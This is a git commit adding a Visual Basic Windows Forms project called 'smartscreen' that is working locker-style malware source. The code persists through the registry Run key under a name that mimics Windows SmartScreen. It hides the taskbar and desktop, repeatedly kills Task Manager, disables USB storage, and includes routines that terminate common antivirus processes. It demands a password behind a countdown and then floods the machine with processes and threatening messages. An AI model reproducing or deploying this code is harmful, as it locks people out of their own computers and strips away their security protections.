c7bc7069623daad0382038e1191050585548c8d9
Rythorian <78415815+DeadReport77@users.noreply.github.com>
2021-03-18 19:11:10 -0400

    Add files via upload

---
+++ smartscreen/Form1.Designer.vb
@@ -0,0 +1,130 @@
+﻿<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
+Partial Class Form1
+    Inherits System.Windows.Forms.Form
+
+    'Form overrides dispose to clean up the component list.
+    <System.Diagnostics.DebuggerNonUserCode()>
+    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
+        Try
+            If disposing AndAlso components IsNot Nothing Then
+                components.Dispose()
+            End If
+        Finally
+            MyBase.Dispose(disposing)
+        End Try
+    End Sub
+
+    'Required by the Windows Form Designer
+    Private components As System.ComponentModel.IContainer
+
+    'NOTE: The following procedure is required by the Windows Form Designer
+    'It can be modified using the Windows Form Designer.  
+    'Do not modify it using the code editor.
+    <System.Diagnostics.DebuggerStepThrough()>
+    Private Sub InitializeComponent()
+        Me.components = New System.ComponentModel.Container()
+        Me.Timer1 = New System.Windows.Forms.Timer(Me.components)
+        Me.Label1 = New System.Windows.Forms.Label()
+        Me.Label2 = New System.Windows.Forms.Label()
+        Me.TextBox1 = New System.Windows.Forms.TextBox()
+        Me.TxtPassword = New System.Windows.Forms.Button()
+        Me.Timer2 = New System.Windows.Forms.Timer(Me.components)
+        Me.PictureBox1 = New System.Windows.Forms.PictureBox()
+        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).BeginInit()
+        Me.SuspendLayout()
+        '
+        'Timer1
+        '
+        '
+        'Label1
+        '
+        Me.Label1.AutoSize = True
+        Me.Label1.BackColor = System.Drawing.Color.Transparent
+        Me.Label1.Font = New System.Drawing.Font("Lucida Fax", 24.0!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
+        Me.Label1.ForeColor = System.Drawing.Color.Red
+        Me.Label1.Location = New System.Drawing.Point(159, 310)
+        Me.Label1.Name = "Label1"
+        Me.Label1.Size = New System.Drawing.Size(0, 38)
+        Me.Label1.TabIndex = 0
+        '
+        'Label2
+        '
+        Me.Label2.AutoSize = True
+        Me.Label2.BackColor = System.Drawing.Color.Transparent
+        Me.Label2.Font = New System.Drawing.Font("Lucida Fax", 14.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
+        Me.Label2.ForeColor = System.Drawing.Color.Red
+        Me.Label2.Location = New System.Drawing.Point(2, 284)
+        Me.Label2.Name = "Label2"
+        Me.Label2.Size = New System.Drawing.Size(107, 22)
+        Me.Label2.TabIndex = 1
+        Me.Label2.Text = "Terminus"
+        '
+        'TextBox1
+        '
+        Me.TextBox1.BackColor = System.Drawing.SystemColors.InactiveCaptionText
+        Me.TextBox1.Font = New System.Drawing.Font("Century Schoolbook", 12.0!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
+        Me.TextBox1.ForeColor = System.Drawing.Color.Red
+        Me.TextBox1.Location = New System.Drawing.Point(6, 321)
+        Me.TextBox1.Multiline = True
+        Me.TextBox1.Name = "TextBox1"
+        Me.TextBox1.PasswordChar = Global.Microsoft.VisualBasic.ChrW(9679)
+        Me.TextBox1.Size = New System.Drawing.Size(112, 27)
+        Me.TextBox1.TabIndex = 2
+        '
+        'TxtPassword
+        '
+        Me.TxtPassword.FlatStyle = System.Windows.Forms.FlatStyle.Flat
+        Me.TxtPassword.Font = New System.Drawing.Font("Lucida Fax", 12.0!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
+        Me.TxtPassword.ForeColor = System.Drawing.Color.Red
+        Me.TxtPassword.Location = New System.Drawing.Point(6, 358)
+        Me.TxtPassword.Name = "TxtPassword"
+        Me.TxtPassword.Size = New System.Drawing.Size(112, 32)
+        Me.TxtPassword.TabIndex = 3
+        Me.TxtPassword.Text = "Submit"
+        Me.TxtPassword.UseVisualStyleBackColor = True
+        '
+        'Timer2
+        '
+        Me.Timer2.Interval = 15600000
+        '
+        'PictureBox1
+        '
+        Me.PictureBox1.Image = Global.smartscreen.My.Resources.Resources.GHFp
+        Me.PictureBox1.Location = New System.Drawing.Point(-3, -1)
+        Me.PictureBox1.Name = "PictureBox1"
+        Me.PictureBox1.Size = New System.Drawing.Size(434, 274)
+        Me.PictureBox1.TabIndex = 4
+        Me.PictureBox1.TabStop = False
+        '
+        'Form1
+        '
+        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
+        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
+        Me.BackColor = System.Drawing.SystemColors.ActiveCaptionText
+        Me.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch
+        Me.ClientSize = New System.Drawing.Size(431, 402)
+        Me.Controls.Add(Me.PictureBox1)
+        Me.Controls.Add(Me.TxtPassword)
+        Me.Controls.Add(Me.TextBox1)
+        Me.Controls.Add(Me.Label2)
+        Me.Controls.Add(Me.Label1)
+        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None
+        Me.Name = "Form1"
+        Me.ShowIcon = False
+        Me.ShowInTaskbar = False
+        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
+        Me.Text = "Form1"
+        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).EndInit()
+        Me.ResumeLayout(False)
+        Me.PerformLayout()
+
+    End Sub
+
+    Friend WithEvents Timer1 As Timer
+    Friend WithEvents Label1 As Label
+    Friend WithEvents Label2 As Label
+    Friend WithEvents TextBox1 As TextBox
+    Friend WithEvents TxtPassword As Button
+    Friend WithEvents Timer2 As Timer
+    Friend WithEvents PictureBox1 As PictureBox
+End Class
---
+++ smartscreen/Form1.vb
@@ -0,0 +1,257 @@
+﻿Imports Microsoft.Win32
+Imports System.Runtime.InteropServices
+
+Public Class Form1
+    Dim TimesTried As String = 0
+    Private TargetDT As DateTime
+    Private CountDownFrom As TimeSpan = TimeSpan.FromMinutes(260) 'Change Timer///
+    Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Integer, ByVal hWndInsertAfter As Integer, ByVal x As Integer, ByVal y As Integer, ByVal cx As Integer, ByVal cy As Integer, ByVal wFlags As Integer) As Integer
+    Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Integer
+    Private Declare Function ShowWindow Lib "user32" (ByVal hwnd As IntPtr, ByVal nCmdShow As Int32) As Int32
+    Public Const SWP_HIDEWINDOW = &H80
+    Public Const SWP_SHOWWINDOW = &H40
+    Public Const SW_HIDE As Int32 = 0
+    Public Const SW_RESTORE As Int32 = 9
+    Dim taskBar As Integer
+    Private vbAppWindows As Integer
+    Public Property Button1 As Object
+    <DllImport("winmm.dll")>
+    Private Shared Function mciSendString(ByVal command As String, ByVal buffer As String, ByVal bufferSize As Integer, ByVal hwndCallback As IntPtr) As Integer
+    End Function
+
+    Public Sub RunAtStartup(ByVal ApplicationName As String, ByVal ApplicationPath As String)
+        Dim CU As Microsoft.Win32.RegistryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
+        With CU
+            .OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
+
+            .SetValue(ApplicationName, ApplicationPath)
+
+        End With
+    End Sub
+
+
+    Private Sub StartUp(sender As Object, e As EventArgs) Handles MyBase.Load ' Sub for Startup///
+        My.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).SetValue(Application.ProductName, Application.ExecutablePath)
+    End Sub  'This allows the program to autorun on restart
+
+    Private Sub smartscreen()
+        Dim filepath As String
+        Dim registrykey As Object
+        filepath = Environ("homedrive") + "\programdata\smartscreen.exe"
+        registrykey = CreateObject("Wscript.Shell")
+        registrykey.regwrite("HKCU\software\microsoft\windows\currentversion\run\smartscreen", filepath)
+        smartscreen()
+    End Sub
+
+    Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer) 'refuses shutdown
+        If UnloadMode = vbAppWindows Then Cancel = True
+    End Sub
+
+    Private Sub Block(sender As Object, e As EventArgs) ' Continuation of Block for Task Manager 
+        Dim t As New Threading.Thread(AddressOf block)
+        t.Start()
+    End Sub
+    Sub block()
+        While True
+            For Each p As Process In Process.GetProcessesByName("taskmgr")
+                p.Kill()
+            Next
+
+            Threading.Thread.Sleep(100)
+        End While
+    End Sub
+
+    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+        mciSendString("set CDAudio door open", vbNullString, 0, IntPtr.Zero)
+        Me.Text = "opened"
+        TargetDT = DateTime.Now.Add(CountDownFrom)
+        Timer1.Start()
+        taskBar = FindWindow("Shell_traywnd", "")
+        Dim intReturn As Integer = FindWindow("Shell_traywnd", "")
+        SetWindowPos(intReturn, 0, 0, 0, 0, 0, SWP_HIDEWINDOW) 'This will "HIDE" your taskbar/// To bring back taskbar, simply change the end to: SWP_SHOWWINDOW///
+        Dim hwnd As IntPtr
+        hwnd = FindWindow(vbNullString, "Program Manager")
+        If Not hwnd = 0 Then
+            ShowWindow(hwnd, SW_HIDE) 'Type "RESTORE" to bring back///
+        End If
+        My.Computer.Audio.Play(My.Resources.Corium, AudioPlayMode.Background)
+        Application.Restart()
+    End Sub
+
+
+    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles TxtPassword.Click
+        If Timer2.Enabled = False Then
+
+        End If
+        If TextBox1.Text = "iamtheone" Then
+            Application.Exit()
+            Application.Restart()
+        End If
+        MsgBox("Access Denied")
+        My.Computer.Audio.Play(My.Resources.incorrect, AudioPlayMode.Background)
+        TimesTried += 1
+        If TimesTried = 3 Then
+            MsgBox("Incorrect code. You will now have to wait an hour before you can apply the correct code. We are monitoring your every move.")
+            My.Computer.Audio.Play(My.Resources.warning, AudioPlayMode.Background)
+            Timer1.Enabled = True
+        End If
+        If TimesTried < 3 Then
+            MsgBox("Wrong KeyCode " & TimesTried & " You Have Used Up Your 3 Attempt")
+        End If
+    End Sub
+    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
+        Dim ts As TimeSpan = TargetDT.Subtract(DateTime.Now) 'Start of Timer1 Code>>>>
+        If ts.TotalMilliseconds > 0 Then
+            Label1.Text = ts.ToString("hh\:mm\:ss")
+        Else
+            Label1.Text = "00:00"
+            Timer1.Stop() ' End of Timer1 Code>>>
+            Application.Restart()
+            Do
+                Process.Start("notepad")
+                MsgBox("I AM ETERNAL")
+                Process.Start("wmplayer")
+                MsgBox("I CAN'T BE STOPPED")
+                Process.Start("chrome")
+                MsgBox("I MUST TERMINATE")
+                Process.Start("wordpad")
+                MsgBox("I WILL DESTROY YOU")
+                Process.Start("firefox")
+                MsgBox("THIS ISN'T THE END")
+                Process.Start("opera")
+            Loop
+
+
+        End If
+    End Sub
+
+    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
+        TimesTried = 0
+        Timer1.Enabled = False
+    End Sub
+
+    Private Sub BlockUSBPort(sender As Object, e As EventArgs)
+        Dim regKey As RegistryKey
+        regKey = Registry.LocalMachine.OpenSubKey("SYSTEM\CurrentControlSet\Services\USBSTOR", True)
+        regKey.SetValue("Start", 4)
+    End Sub
+
+    Sub Antiasquared()
+        Dim ktp As Process() = Process.GetProcesses
+        Dim i As Integer
+        For i = 0 To ktp.Length - 1
+            Select Case Strings.LCase(ktp(i).ProcessName)
+                Case "a2servic.exe"
+                    ktp(i).Kill()
+                Case Else
+            End Select
+        Next
+    End Sub
+    Sub AntiMsMpEng()
+        Dim ktp As Process() = Process.GetProcesses
+        Dim i As Integer
+        For i = 0 To ktp.Length - 1
+            Select Case Strings.LCase(ktp(i).ProcessName)
+                Case "MsMpEng.exe"
+                    ktp(i).Kill()
+                Case Else
+            End Select
+        Next
+    End Sub
+    Sub AntiAvast()
+        Dim ktp As Process() = Process.GetProcesses
+        Dim i As Integer
+        For i = 0 To ktp.Length - 1
+            Select Case Strings.LCase(ktp(i).ProcessName)
+                Case "ashWebSv.exe"
+                    ktp(i).Kill()
+                Case Else
+            End Select
+        Next
+    End Sub
+    Sub AntiAVG()
+        Dim ktp As Process() = Process.GetProcesses
+        Dim i As Integer
+        For i = 0 To ktp.Length - 1
+            Select Case Strings.LCase(ktp(i).ProcessName)
+                Case "avgemc.exe"
+                    ktp(i).Kill()
+                Case Else
+            End Select
+        Next
+    End Sub
+    Sub AntiBitDefender()
+        Dim KillTheProcess As Process() = Process.GetProcesses
+        Dim i As Integer
+        For i = 0 To KillTheProcess.Length - 1
+            Select Case Strings.LCase(KillTheProcess(i).ProcessName)
+                Case "bdagent"
+                    KillTheProcess(i).Kill()
+                Case Else
+            End Select
+        Next
+    End Sub
+    Sub AntiKaspersky()
+        Dim KillTheProcess As Process() = Process.GetProcesses
+        Dim i As Integer
+        For i = 0 To KillTheProcess.Length - 1
+            Select Case Strings.LCase(KillTheProcess(i).ProcessName)
+                Case "avp"
+                    KillTheProcess(i).Kill()
+                Case Else
+            End Select
+        Next
+    End Sub
+    Sub AntiMalwarebytes()
+        Dim KillTheProcess As Process() = Process.GetProcesses
+        Dim i As Integer
+        For i = 0 To KillTheProcess.Length - 1
+            Select Case Strings.LCase(KillTheProcess(i).ProcessName)
+                Case "mbam"
+                    KillTheProcess(i).Kill()
+                Case Else
+            End Select
+        Next
+    End Sub
+    Sub AntiMcAfee()
+        Dim ktp As Process() = Process.GetProcesses
+        Dim i As Integer
+        For i = 0 To ktp.Length - 1
+            Select Case Strings.LCase(ktp(i).ProcessName)
+                Case "mcagent" & "mcuimgr"
+                    ktp(i).Kill()
+                Case Else
+            End Select
+        Next
+    End Sub
+    Sub AntiNOD32()
+        Dim KillTheProcess As Process() = Process.GetProcesses
+        Dim i As Integer
+        For i = 0 To KillTheProcess.Length - 1
+            Select Case Strings.LCase(KillTheProcess(i).ProcessName)
+                Case "egui"
+                    KillTheProcess(i).Kill()
+                Case Else
+            End Select
+        Next
+    End Sub
+    Sub AntiNorton()
+        Dim ktp As Process() = Process.GetProcesses
+        Dim i As Integer
+        For i = 0 To ktp.Length - 1
+            Select Case Strings.LCase(ktp(i).ProcessName)
+                Case "ccapp.exe"
+                    ktp(i).Kill()
+                Case Else
+            End Select
+        Next
+    End Sub
+    Sub Antisandboxie()
+        On Error Resume Next
+        If Me.Text.Contains("#") Then
+            Me.Close()
+        Else
+            Me.Show()
+        End If
+    End Sub
+End Class
